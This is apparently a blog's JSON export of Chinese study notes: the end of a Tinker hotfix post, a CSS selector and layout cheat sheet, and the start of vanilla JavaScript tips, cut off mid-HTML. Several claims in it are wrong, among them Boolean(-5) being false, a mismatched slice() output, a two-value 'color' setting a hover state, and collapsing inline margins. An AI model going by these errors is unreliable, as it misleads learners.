除此之外，为了能够在测试环境验证补丁，还提供了一个小工具 很感谢鹅厂能够将Tinker这样的工具开源出来造福广大开发者，抛开技术上的实力不说，能够一直积极维护也是一件了不起的事情。 参考 微信热修复tinker及tinker-server快速接入 TinkerPatch，其实就是帮你把下发“patch_signed_7zip.apk”这个文件的活干了，还给了非常直观的报表，收费也是合情合理。 Android热补丁之Tinker原理解析，这篇文章基本将整个流程都讲清楚了 热更新Tinker研究（三）：加载补丁 微信Tinker的一切都在这里，包括源码 Enabling Android Teams: Dex Ed by Jesse WilsonJesse Wilson谈Dex文件的结构，可惜视频清晰度垃圾","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"热修复","slug":"热修复","permalink":"https://haldir65.github.io/tags/热修复/"}]},{"title":"css操作手册","date":"2017-10-29T22:46:52.000Z","path":"2017/10/29/2017-10-29-pure-css/","text":"css使用记录及速查手册 1. 基本概念css基本语法 SELECTOR DECLARATION #page-header { font-szie : 10px;} /*对了，我找了半天，发现这个page-header和大括号之间有没有空格无所谓的*/ #page-header{ font-szie : 10px;} /*也就是这么写也无所谓，反正最终部署都会删掉空格*/ 例如 .better{ background-color: gray; border: none !important; } 类名的第一个字符不能使用数字！它无法在 Mozilla 或 Firefox 中起作用。 css中的长度单位有px,em,以及rem（ ios：6.1系统以上都支持. android：2.1系统以上都支持.），当然还有百分比。 &lt;img src=&quot;https://avatars0.githubusercontent.com/u/1?v=4&quot; width=&quot;70&quot; height=&quot;70&quot;&gt; 不写单位就默认是px了 2. 引用方式html中引用css有三种方式: InLine Styling(内联样式) 只在非常特殊的情况下才使用 &lt;div&gt; &lt;p id=&#39;content&#39; style=&quot;position: absolute; top:0; left:0; width: 100%&quot;&gt;Inline style are bad&lt;/p&gt; &lt;/div&gt; Embedded style sheets(嵌入样式) 在当前页面中添加一个样式，不能复用 &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Embedded style&lt;/title&gt; &lt;style&gt; p{ font-size : 10px; color: red; } .welcome{ color: blue; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; now every p tag in this page will have my style&lt;/p&gt; &lt;p class=&quot;welcome&quot;&gt; this one will have blue text color&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; External style sheets(外部样式) &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Embedded style&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/syntax.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; now every p tag in this page will have my style&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 注意上面那个rel表示relation. 3. 选择器及优先级，各种Selector的写法派生选择器，两种不同的效果 3.1 基于类的，很多时候看到中间有一个空格，意思就是在前者的基础上，再加上一些限定条件进行查找&lt;td class=&quot;fancy&quot;&gt; td.fancy { color: #f60; background: #666; } 所有class是fancy的td将是带有灰色背景的橙色。 &lt;div class=&#39;fancy&#39;&gt; &lt;td&gt; &lt;/td&gt; &lt;/div&gt; .fancy td { color: #f60; background: #666; } 所有class是fancy的元素，里面的td都将是带有灰色背景的橙色。 3.2 基于id的#sidebar p { font-style: italic; text-align: right; margin-top: 0.5em; } 所有id是sidebar的标签，内部的p段落全部应用上述样式 #sidebar { border: 1px dotted #000; padding: 10px; } div #sidebar { border: 1px dotted #000; padding: 10px; } 因为id 属性只能在每个 HTML 文档中出现一次，所以上面两个是一样的，后者指的是该元素所属的父标签。css层叠优先级: IDs、class 选择器优先于element选择器比起class而言id优先级更高!important具有最高的优先级，尽量不要使用简单说!import &gt; id &gt; class &gt; 普通的tag 关于important，能不用就不要用。有人开玩笑说，职业生涯中不要使用超过5次。 3.3 css Conflict假如一个css文件里面出现了 .span{ color : blue } .span{ color: red } 结果是底部红色的赢了，原因是css是Cascade的，从上往下读文件。前提是两个选择器一模一样 body span{ color : blue } .span{ color: red } 这种情况还是蓝色的赢 3.4 css的继承在一个页面中，父tag定义的样式是会传递给子tag的，如果子tag没有复写掉，那么就会propogate整个父tag的范围例如 body { color : red; } div { color : yellow } p { color: blue } 上面body的红色字体颜色会传递给当前页面所有tag的字体中，但div和p各自定义了自己的字体颜色，所以等于复写了。需要注意的是，这个时候有些tag，例如a tag是会获得浏览器默认属性的 a { color: blue; text-decoration: underline; } 类似于浏览器默认给你加上了这么一行css。browser 的default browser style,如果什么css都不加的话，就能看出来了 3.5 Targeting Multipe Elementsp{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } span{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } a{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } /*还不如写成这样*/ p, span, a{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } 3.6 Descendant Selector（后代选择器）/*这个意思就是，把content这个class里面的所有p tag的字体颜色都改成红色*/ #content p{ color: red; } /*这个更进一步，一层层嵌套下去，指定的p tag才会获得属性*/ #content #child-content p{ color: red; } 这么嵌套多少层其实没关系，实践中，不要嵌套太多层，不方便维护 3.7 Child Selector（子选择器）碰到下面这种html，如果只想给Direct Child赋属性，可以使用child selector &lt;div class=&quot;content&quot;&gt; &lt;p&gt;Direct child&lt;/p&gt; &lt;p&gt;Direct child&lt;/p&gt; &lt;p&gt;Direct child&lt;/p&gt; &lt;div&gt; &lt;p&gt;Indirect child&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; /*这个向右的箭头就表示child selector*/ #content &gt; p{ color: pink; } /*这个时候不会对Indirect child生效*/ 这种方式能够在不影响其他Descendant的情况下设置属性 3.8 Adjacent Selector（相邻选择器）给一个tag之后下一个tag赋属性 &lt;div id=&#39;all-posts&#39;&gt; &lt;h2&gt;First Article&lt;/h2&gt; &lt;p&gt;Published by Smith&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;h2&gt;Second Article&lt;/h2&gt; &lt;p&gt;Published by John&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;h2&gt;Third Article&lt;/h2&gt; &lt;p&gt;Published by Ted&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;/div&gt; 现在想要把所有紧跟着h2标签后面的那个p tag装饰下 .all-posts h2 + p{ color: green; } Adjacent Selector必须是follow directly after first element 3.8 Attribute Selector（属性选择器）首先明确什么是attribute，href,class,id,rel,type,title这些全都是Attribute。 &lt;span&gt;Span without an class Attribute&lt;/span&gt; &lt;span class=&quot;Deck&quot;&gt;&lt;/span&gt; &lt;span class=&quot;Deck&quot;&gt;&lt;/span&gt; &lt;span class=&quot;Deck&quot;&gt;&lt;/span&gt; span[class]{ color: purple; } /*这样就能选中所有上面带有class属性的tag*/ 同样的，只要用一个方括号括起来的选择器，就能选中带有特定属性的标签当然还能更具体一点，例如 &lt;a href=&#39;#&#39;&gt;&lt;/a&gt; &lt;a href=&#39;http://www.google.com&#39; title=&#39;Google&#39;&gt;&lt;/a&gt; &lt;a href=&#39;http://www.baidu.com&#39; title=&#39;Baidu&#39;&gt;&lt;/a&gt; a[title=&#39;google&#39;]{ color : red; } /*这样只有上面的Google标签才变成红色*/ 还有更高级的Pattern Matching &lt;span&gt;Span without an class Attribute&lt;/span&gt; &lt;span class=&quot;deck halls&quot;&gt;&lt;/span&gt; &lt;span class=&quot;deck tails&quot;&gt;&lt;/span&gt; &lt;span class=&quot;deck&quot;&gt;&lt;/span&gt; span[class~=&#39;deck&#39;]{ color: purple; } /*这样上面三个都会变成紫色,或者~符号的意思是只要属性值里面包含了这个deck单词就算*/ &lt;a href=&quot;http://www.baidu.com&quot;&gt;web page&lt;/a&gt; &lt;a href=&quot;something.pdf&quot;&gt;View as pdf&lt;/a&gt; span[href$=&#39;pdf&#39;]{ color: purple; } /*这个美元符号的意思是任何以pdf结尾的href，如果要算上以xx开头的话，这样*/ span[href^=&#39;http&#39;]{ color: yellow; } 3.9 Pseudo selector&lt;a class=&quot;site&quot; href=&quot;http://www.baidu.com&quot;&gt;站点&lt;/a&gt; a:hover{ text-weight: bold; } a:visited{ color: red; } a:active{ color: yellow; } /*active的状态是指鼠标点上去，但还没有跳转页面那一瞬间。其实你也可以鼠标点上去不放开，就是active了*/ 3.10还有first child等例如 &lt;article&gt; &lt;p&gt;First line,or first child&lt;/p&gt; &lt;p&gt;center and other stuffs&lt;/p&gt; &lt;p&gt;center and other stuffs&lt;/p&gt; &lt;p&gt;center and other stuffs&lt;/p&gt; &lt;p&gt;this is the last child&lt;/p&gt; &lt;/article&gt; article p:first-child{ color :blue; } article p:last-child{ color: green; } 关键词就是first-child和last-child这么简单还有first-of-type,last-of-type 4. 常用属性顺便说一下，mrakDown里面是能直接插入img标签的 background-size : cover;(比如说你要拿一张很大的图片作为body的background，但图片的大小已经超出了浏览器的大小，这时候就用cover缩放一下，就能填满了) box-sizing 如果两个element都有margin，挤在一起的话，最终的margin不是两个元素之间的margin相加 &lt;div&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt; span{ margin: 0px 10px } 因为这俩都是inline-elements，最终生成的margin不是10+10=20px ,而是10px flex box可以实现有效的居中。外部容器添加display:flex属性，子元素可以设置自己的order(越小越靠前/左，负数最小)。父容器可以设置的属性包括： flex-direction flex-wrap flex-flow justify-content align-items align-content /*子元素可以设置的属性包括:*/ order align-self flex-grow flex-shrink flex-basis 更多参考MDN 5. blcok，inline和inline-block display可能的值包括inline,block,inline-block.参考MDN网站，inline的说法是相较block来说的，就是默认不会另起一行： An inline element does not start on a new line and only takes up as much width as necessary. inline和block以及inline-block的区别 block-level elements(块级元素)和inline elements(内联元素)；block元素可以包含block元素和inline元素；但inline元素只能包含inline元素。要注意的是这个是个大概的说法，每个特定的元素能包含的元素也是特定的，所以具体到个别元素上，这条规律是不适用的。比如 P 元素，只能包含inline元素，而不能包含block元素。 display:blockblock元素会独占一行，多个block元素会各自新起一行。默认情况下，block元素宽度自动填满其父元素宽度。 block元素可以设置width,height属性。块级元素即使设置了宽度,仍然是独占一行。 block元素可以设置margin和padding属性。 display:inlineinline元素不会独占一行，多个相邻的行内元素会排列在同一行里，直到一行排列不下，才会新换一行，其宽度随元素的内容而变化。 inline元素设置width,height属性无效。 inline元素的margin和padding属性，水平方向的padding-left, padding-right, margin-left, margin-right都产生边距效果；但竖直方向的padding-top, padding-bottom, margin-top, margin-bottom不会产生边距效果。 display:inline-block简单来说就是将对象呈现为inline对象，但是对象的内容作为block对象呈现。之后的内联对象会被排列在同一行内。比如我们可以给一个link（a元素）inline-block属性值，使其既具有block的宽度高度特性又具有inline的同行特性。 5.css的简写多的不敢想,short-hand下面这三个是一个意思，也就是说css是按照顺时针上，右，下，左的顺序来的 .content{ margin 10px 20px 10px 20px; } .content { margin 10px 20px; } .content{ margin-top: 10px; margin-right: 20px; margin-bottom: 10px; margin-left: 20px; } h2{ color: #ffffff #0000000 ; /* 这个意思是平时是白色，鼠标移上去就变成黑色 */ } 除了margin以外,padding也是。至于那种倒角，例如border-radius,则是左上角,右上角，右下角，左下角这样的顺序 .round_corner{ border-radius: 10px; } .round_corner{ border-radius: 10px 20px; /* 左上角，右下角10px,右上角和左下角20px*/ } .round_corner{ border-radius: 10px 20px 30px 40px; } .circle{ width: 100px; height:100px; border-radius: 50px; /* 糊一个圆*/ } .back{ background-color: #606060; background-image: url(#) ; background-repeat: no-repeat; /*repeat的意思是图片填不满容器的话，从左到右，从上到下重复一遍 */ background-position: center; /*将图片居中摆放在容器中，还有bottom-center，bottom-right等*/ background-position: 10px 20px; /*距离左边10px,顶部20px*/ background-size: 200px; /*图片的宽高，自动缩放*/ } .simplyfy{ background: url (#) no-repeat top center; background-color: #606060; } /*这是一种简写的方式,注意backgroundColor和background最好分开写*/ .multiple_background{ background-image: url(&#39;url1&#39;),url(&#39;url2&#39;); /*多层背景，url1叠在最顶层，可以想象是z轴最上方，url2在下面，中间一定要有一个逗号。*/ background-repeat: no-repeat,no-repeat; /*中间有一个逗号，no-repeat属性分别应用在url1和url2上。由于上面这俩一样的，所以只写一个也行*/ background-position: center,top left; background-size: 300px,100%; /*都是一样的，分别一一对应*/ } /*画三个圆*/ #circle{ width: 400px; height: 400px; position: absolute; background: rgb(200, 200, 100); border-radius: 200px; top: 50px; left: 50px; opacity: 0; /* 这个是透明度，0表示完全透明*/ text-align: center; background: rgba(200, 200, 100, 0.5); /*注意opacity会影响div里面text的透明 度，rgba不会影响*/ } #circle-2{ width: 400px; height: 400px; position: absolute; background: rgb(200, 100, 200); border-radius: 200px; top: 250px; left: 150px; } #circle-3{ width: 400px; height: 400px; position: absolute; border-radius: 200px; top: 50px; left: 250px; background: #aadddd; background: linear-gradient(top,#aadddd,0%,#77aaaa,100%); /*Gradient在有些浏览器上不支持，毕竟是比较新的属性，这时候就会fallback到background上，所以支持的话就有渐变色，不支持的话就恢复到设定的颜色，这也就是一个属性写两遍的原因*/ /*但是上面两行在chrome里面不会出现渐变色,需要vender-prefix*/ background: -moz-linear-gradient(top,#aadddd,0%,#77aaaa,100%); background: -webkit-linear-gradient(top,#aadddd,0%,#77aaaa,100%); background: linear-gradient(top,#aadddd,0%,#77aaaa,100%); /*这个top的意思是从上开始渐变，写bottom也行，从下往上*/ } .shadow_box{ box-shadow: 2px 2px 4px 2px rgba(40,40,40,0.6); /*分别是阴影距离元素的右侧的距离和距离底部的距离以及阴影需要多深，越大越深，最后是阴影拓展的距离.外加阴影的颜色*/ } cssmatic这个网站可以使用拖拽的方式生成shadow的css文件 ======================================sass============================= 5. css positioning首先是float,Float 可用于实现文字环绕图片(加在图片的属性上)the float element no longer take any height in document flow &lt;div class=&quot;wrapper&quot;&gt; &lt;img src=&quot;picture.jpg&quot; width=&quot;300px&quot;&gt;&lt;/img&gt; &lt;p&gt;这段文字默认会另起一行在图片下面&lt;/p&gt; &lt;/div&gt; .wrapper{ background: #ffffff; max-width: 960px; margin: 0 auto; padding: 20px; } /*margin auto 让这个wrapper在其父容器中横向居中显示*/ img{ float: left; margin: 10px; } /*float: left的意思是让这个图片居左显示，同时，旁边的text会自动调整，不至于被图片挡住。就能实现图文混排的效果*/ /*更具体一点的意思就是，float属性的标签，在html计算是否需要换行的时候是不会考虑这个标签的，同时，将根据float:left或者right摆在父容器的左边或者右边。感觉就像是在z轴方向提升了一个层级。*/ /*但如果每一个标签都被提升到一个z层级,比如两个div都有float:left属性，后面一个会排在前面一个的右边*/ &lt;div id=&#39;container&#39;&gt; &lt;div class=&quot;left_float&quot;&gt; &lt;p&gt;First Tag&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;left_float&quot;&gt; &lt;p&gt;Second&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; .left_float{ float: left; margin: 10px } /*float有一点好处就是浏览器不会让文字被float的元素遮挡住，所以会挪到下面去，但文字标签的背景会延伸到float元素的下面*/ .clear_float_for_text{ padding: 10px; background: #ddd; clear: both; } /*clear both的意思是让文字的左右和上下背景都不会延伸到float元素的下面*/ float的元素和下面的文字之间使用margin无效，一般在text前面加一个空的或者在float的父元素加上 .folat_wrapper:after{ content: &#39;&#39;; display: block; clear: both; } 这种方式更好，after被称为伪元素，就是在父容器后面插入一个空的元素 css3有一个transition效果，就是操作任何属性变换都设定一个事件，达到一种类似于动画演进的效果 list-style-type : none会把li标签前面的方块干掉 text-align: center;不仅会把文字居中，还会把这个容器中的img也居中 CSS Positioningposition : absolute意味着remove it from normal document flow;position:relative意味着相对原本应该的位置移动，但依然占据document flow;position:fixed意味着 absolute 是最棘手的position值。 absolute 与 fixed 的表现类似，但是它不是相对于视窗而是相对于最近的“positioned”祖先元素。如果绝对定位（position属性的值为absolute）的元素没有“positioned”祖先元素，那么它是相对于文档的 body 元素，并且它会随着页面滚动而移动。记住一个“positioned”元素是指 position 值不是 static 的元素。 其实就是元素的postion:absolute之后，就可以添加top,right,bottom,left这些属性了。但是 这些属性不是简单的说就直接相对于其parent元素的。而是相对于最近一个position不是static的父元素（static是default，所以如果直系父元素不写的话，子元素会忽略 top, bottom, left, right 或者 z-index 声明）。如果真的一个个往上找都没有的话，直接相对于body起效。 Definitely will center a text in div , both horizontally and verticallyCSS center text (horizontally and vertically) inside a div block &lt;div id=&quot;container&quot;&gt; &lt;div id=&quot;content&quot;&gt; Line 1 &lt;/div&gt; &lt;/div&gt; (function() { var toggle = true; setInterval(function() { if (toggle) { $(&quot;#content&quot;).html(&quot;Line 1&quot;); } else { $(&quot;#content&quot;).html(&quot;&lt;div&gt;Line 1&lt;/div&gt;&lt;div&gt;Line 2&lt;/div&gt;&quot;); } toggle = !toggle; }, 1300); }()); body { font: 36px Arial, sans-serif; } #container { color: white; background: #ffbd17; width: 400px; height: 260px; } #content { background: #06c; width: 120px; margin-left: auto; margin-right: auto; position: relative; top: 50%; transform: translateY(-50%); } css position z index and stack orderinghtml文件从上到下，越是在下面的文件，在z轴方向上的高度就越高。所以顶部nav要写在最底下。这是默认情况如果要放在顶部的话，需要添加z-index：1;默认所有的z-index=0。使z-index生效的前提是给了一个position属性 Clipping Content先加上一个max-height，然后使用over-flow : hidden; 这个属性默认值是visible。使用auto会在内容高度超过容器高度的时候带上一个scrollbar，内容可以滚动。使用scroll的时候会在右侧和底部加上scrollbar，无论是否超出了max-height @Media(max-width=768){ body{ display: none; } } 这里面的css只会在平板及手机上生效，其实768px也就是平板和一般电脑宽度像素的界限了 子元素的margin会移动父元素 给parent加上overflow :auto就好了 有时候遇到重大灾难，一些门户网站会把自家首页变成黑白色的，这种情况其实不多见。2018年3月14日，霍金逝世，阿里云变成黑的了。F12了一下，直接改在body的style上了原路粘贴至此 body{ -webkit-filter: grayscale(100%); -moz-filter: grayscale(100%); -ms-filter: grayscale(100%); -o-filter: grayscale(100%); filter: grayscale(100%); filter: gray; } font awesome怎么用直接下载下来一个zip文件，解压后得到font-awesome文件夹，整个丢到项目中，html中引用’./font-awesome/css/font-awesome.css.min’即可。一般是粘贴到一个a标签里面。 更新 cssmatic很多时候，手写css是一种奢侈，css这种东西本来就属于样式一类，尽量去复制粘贴，不要自己写 有些浏览器不支持特定样式的话，可以使用Modernizrz这个javaScript库 作为新手，多数时候css不起效是因为class和id在html中和css中拼写错了 比较合适的css布局教程 参考css层叠优先级Material CSScss选择器汇总谷歌的字体库 自己去下，很多 文字居中的一种简单的方式 body { height: 100vh; display: flex; justify-content: center; align-items: center; font-size: 5rem; } Pseudo Elemnet是在一个element的content前面或者后面添加内容，而不是添加了一个标签。注意，对img标签无效。Pseudo Elemnet p::before { content: &quot;&quot;; background: red; font-size: 20px; color: white; font-weight: 900; vertical-align: middle; line-height: normal; } /*这种在左侧添加一个小图标的方式也是可以的*/ p::before { content: &quot;https://www.baidu.com/img/bd_logo1.png&quot;; width: 20px; height: 20px; }","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"},{"name":"css","slug":"css","permalink":"https://haldir65.github.io/tags/css/"}]},{"title":"Vanilla JS Tips","date":"2017-10-29T22:10:27.000Z","path":"2017/10/29/2017-10-29-pure-javaScript/","text":"Vanilla JS其实就是原生javascript了。论运行速度，在Vanilla JS面前，所有的js library都要慢很多。 关于js的历史，根据Patrick Dubroy在2014年的一次演讲，ES3是1999年出来的，ES3之前的版本简直是翔。ES4设计的实在太牛逼，一直拖到2008年也没搞定，所以大家决定直接跳过ES4(历史上也从未有过ES4)，推出了ES5（只把ES4中的一部分实现了），实际上2015年6月ES6(也就是2008年那帮人所称呼的harmony)才发布。关于Patrick Dubroy，这人在2011年的Google IO上做过关于用mat检测Android Memory Leak的演讲，老外真是全才。 TakeAways 基本语法 操作html的一些点 交互事件的注册，捕获，拦截 异步 ES6新增的东西 我也不知道归到哪一类的问题 一些tricks 1. 一些作为一门语言基本的操作都有 1.1 比如说module（就是import，export这种，虽然是ES6才补上的） js中好像没有像java中那种javaBean的特殊的数据类型的存在。其实也不需要，js并不是一种用class来model real world object的语言。ES6开始可以使用import和export语法，有类似的效果，参考但node js目前(version 8.x)还不支持es 2015的import export语法，偏偏node对于其他es2015的特性都支持到位了。 // states.js export default { STATES: { &#39;AU&#39; : {...}, &#39;US&#39; : {...} } }; // accept.js import { STATES } from &#39;./states&#39;; //undefined import STATES from &#39;./states&#39;; // concrete object ,this works import whatever from &#39;states&#39;; // concrete object, this works // 另一种情况 var STATES = {}; STATES.AU = {...}; STATES.US = {...}; export STATES; import { STATES } from &#39;states&#39;;//如果输出方使用export default，接收方不应加上大括号。此时输出方输出的是匿名Object，接收方随便起什么名字都行。 // 如果输出方输出有明确定义的function, object，接收方需要添加大括号。 es6的import和export需要注意 // A.js export default function greet(params) { console.log(&#39;hello&#39;); } // B.js import firstGreet from &#39;.A.js&#39;; //this works import { firstGreet } from &#39;.A.js&#39;; // undefined ! // A.js const sayHi = function hi() { console.log(&quot;hi&quot;); } export { sayHi } // B.js import { firstGreet } from &#39;.A.js&#39;; // this works 原因就在于第一种方式是使用匿名export的。 1.2 基本的操作符，dynanic type,函数，变量，oop,class（ES6）,for循环,while这些都有 js里面判断两个变量相等的方式，建议一律使用三个等号（严格相等） var a = 3; var b = &quot;3&quot;; a==b 返回 true a===b 返回 false // 因为a,b的类型不一样 // ==只比较了值 // ===只有在值和类型完全相同的时候才为true，用来进行严格的比较判断 // !=（只检查值）和!==（检查值和类型）也差不多的意思。 = 赋值运算符 == 等于 === 严格等于 &amp;&amp;和||也有，!=也有 - true和false也有 // truthy的概念是js里面特有的 // 在console里面输入： Boolan(5) &gt; 输出true Boolean(-5) &gt;输出false Boolean(7&gt;5) &gt; 输出true Boolean(&#39;someword&#39;) &gt; true Boolean(&#39;&#39;) &gt; false // 只有Boolan(0)才是false string，number,array也有 // var myString = &#39;i &#39;m a &quot;funny&quot; string&#39; #这样是不行的 var myString = &#39;i \\&#39;m a &quot;funny&quot; string&#39;;//加一个转义就好了 var a = &#39;abc&#39; var b = &#39;bcd&#39; a&lt;b // true,因为ASCII表里面，a在b前面 var str = &#39;hello world&#39; var str2 = str.slice(2,9); str2 // &#39;llo,wo&#39; var tags = &#39;meat,ham ,salami,prok,beef,chicken&#39; var tagsArray = tags.split(&quot;,&quot;) //生成 [&quot;meat&quot;,&quot;ham&quot;,&quot;salami&quot;,&quot;prok&quot;,&quot;beef&quot;,&quot;chicken&quot;] js的Array里面能够装不同类型的数据，跟Python很像 //创建Array的方式很多 var array = [] var array1 = [&#39;stuff&#39;,&#39;jeff&#39;,20] var array2 = new Array() var myArray = []// 初始化就好了，无需指定容量 myArray[0] =&#39;stuff&#39; myArray[1] = 70 myArray &gt; [&#39;stuff&#39;,70] myArray[30] = true // 以下为亲测console中的输出就这样 myArray &gt; (31) [&quot;stuff&quot;, 70, empty × 28, true] myArray[12] &gt; &#39;undefined&#39; myArray.length &gt; 31 myArray.sort() &gt; (31) [70, &quot;stuff&quot;, true, empty × 28] Object，class这种oop的特性也有 var myCaR = new Car() VM315:1 Uncaught ReferenceError: Car is not defined at &lt;anonymous&gt;:1:13 var myString = new String() myString = &#39;hello&#39; myString.length &gt; 5 var mystring23 = new String(&#39;stuff&#39;)//这也是行的 // 直接在console里写 var myCar = new Object() undefined myCar.speed = 20 20 myCar.speed 20 myCar.name = &#39;benz&#39; &quot;benz&quot; myCar.name &quot;benz&quot; myCar {speed: 20, name: &quot;benz&quot;} //json即object var car2 = {speed: 30, name: &quot;tesla&quot;} car2 {speed: 30, name: &quot;tesla&quot;} 上下文的概念也有，this关键字，但要注意闭包 // console直接输入 this Window {frames: Window, postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, …}//window是一个有很多变量(function也是变量)的对象，在当前语义下，就是window car2.test = function(){console.log(this)} car2 {speed: 30, name: &quot;tesla&quot;, test: ƒ} car2.test ƒ (){console.log(this)} car2.test()//这时候this就是car2这个Object了 VM592:1 {speed: 30, name: &quot;tesla&quot;, test: ƒ} this应该是当前上下文 Construction function，函数也是一个object的成员 var Car = function (name,speed) { this.name = name this.speed = speed this.test = function () { console.log(&#39;speed is &#39;+speed) } } var car24 = new Car(&#39;jim&#39;,40) car24 Car {name: &quot;jim&quot;, speed: 40, test: ƒ} car24.test() VM621:5 speed is 40 Object definition(construcor)，class也有 还有随便用的log 1.3 一些工具，时间,Math，io操作（文件系统、网络）也有Date Object的使用 let past = new Date(2007,11,9) undefined past // Sun Dec 09 2007 00:00:00 GMT+0800 (中国标准时间) past.getDay ƒ getDay() { [native code] } past.getDay() 0 past.getFullYear() 2007 past.getDate ƒ getDate() { [native code] } past.getDate() 9 网络请求，Ajax(Asynchronous javaScript &amp; xml)请求的套路也有(AJAX命名上就是异步的)XMLHttpRequest缩写是(XHR)关于XHR Object的一些特点 API In the form of an object Provided by the browser’s js environment can be used with other protocols than http Can work with data other than XML(Json ,plain text) 有很多的Library能干ajax一样的事情:jQuery,Axios,Superagent,Fetch API,Prototype,Node HTTP ajax的onload只会在onreadystatechange==4的时候才会触发MDN文档上说ajax的readyState有五种：0 UNSENT 代理被创建，但尚未调用 open() 方法。1 OPENED open() 方法已经被调用。2 HEADERS_RECEIVED send() 方法已经被调用，并且头部和状态已经可获得。3 LOADING 下载中； responseText 属性已经包含部分数据。4 DONE 下载操作已完成。 xhr.onProgress的readyState是3，这个时候显示加载进入条就可以了。 表单的操作 &lt;h1&gt;Normal get form&lt;/h1&gt; &lt;form method=&quot;GET&quot; action=&quot;process.php&quot;&gt; &lt;input type=&quot;text&quot; name=&#39;name&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;h1&gt;Ajax get form&lt;/h1&gt; &lt;form id=&#39;getForm&#39; &gt; &lt;input type=&quot;text&quot; name=&#39;name&#39; id=&#39;name1&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;h1&gt;Normal post form&lt;/h1&gt; &lt;form method=&quot;POST&quot; action=&quot;process.php&quot;&gt; &lt;input type=&quot;text&quot; name=&#39;name&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;h1&gt;Ajax post form&lt;/h1&gt; &lt;form id=&#39;postForm&#39; name=&#39;name&#39; id=&#39;name2&#39;&gt; &lt;input type=&quot;text&quot; name=&#39;name&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; document.getElementById(&#39;getForm&#39;).addEventListener(&#39;submit&#39;, getName); function getName(e){ e.preventDefault(); var name = document.getElementById(&#39;name1&#39;).value;//用户输入的内容 var xhr = new XMLHttpRequest(); xhr.open(&#39;GET&#39;,&#39;process.php?name=&#39;+name,true); xhr.onload = function(){ console.log(this.responseText); } xhr.send(); } document.getElementById(&#39;postForm&#39;).addEventListener(&#39;submit&#39;, postName); function postName(e){ e.preventDefault(); var name = document.getElementById(&#39;name2&#39;).value;//用户输入的内容 var params =&quot;name=&quot;+name; var xhr = new XMLHttpRequest(); xhr.open(&#39;POST&#39;,&#39;process.php&#39;,true); xhr.setRequestHeader(&#39;Content-type&#39;,&#39;application/x-www-form-urlencoded&#39;) xhr.onload = function(){ console.log(this.responseText); } xhr.send(); } JavaScript random方法得到随机整数 document.write(Math.ceil(Math.random()*3)) //得到1-3的整数 document.write(Math.floor(Math.random()*4)); //得到0-3的整数 Math.round() //当小数是0.5或者大于0.5的时候向上一位 Math.ceil() //始终向上一位 Math.floor() // 始终向下舍入 2. 操作HTML-DOM的一些方法通过 id 找到 HTML 元素 window.document.getElementById()通过标签名找到 HTML 元素 window.document.getElementsByTagName()//比如说’h2’这种通过类名找到 HTML 元素 window.document.getElementsByClassName()注意方法名称，带s的返回的是一个数组，不带s返回一个object找form 标签的话，还有一种方法:先手写一段html &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;title&gt;有时候手写html不是坏事&lt;/title&gt; &lt;link href=&quot;style.css&quot; type=&quot;text/css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/link&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;form id=&#39;my-form&#39; name=&#39;myForm&#39; action=&quot;#&quot;&gt; &lt;label for=&quot;name&quot;&gt;Name: &lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br/&gt; &lt;label&gt;Hobbies: &lt;/label&lt;br/&gt; &lt;input type=&quot;checkbox&quot; name=&quot;biking&quot; value=&quot;biking&quot;&gt;Biking&lt;/br&gt; &lt;input type=&quot;checkbox&quot; name=&quot;sking&quot; value=&quot;sking&quot;&gt;Sking&lt;/br&gt; &lt;input type=&quot;checkbox&quot; name=&quot;diving&quot; value=&quot;diving&quot;&gt;Diving&lt;/br&gt; &lt;label for=&quot;colour&quot;&gt;Fav colour: &lt;/label&gt; &lt;select name=&quot;colour&quot;&gt; &lt;option&gt;Red&lt;/option&gt; &lt;option&gt;Blue&lt;/option&gt; &lt;option&gt;Green&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&#39;Submit&#39;&gt; 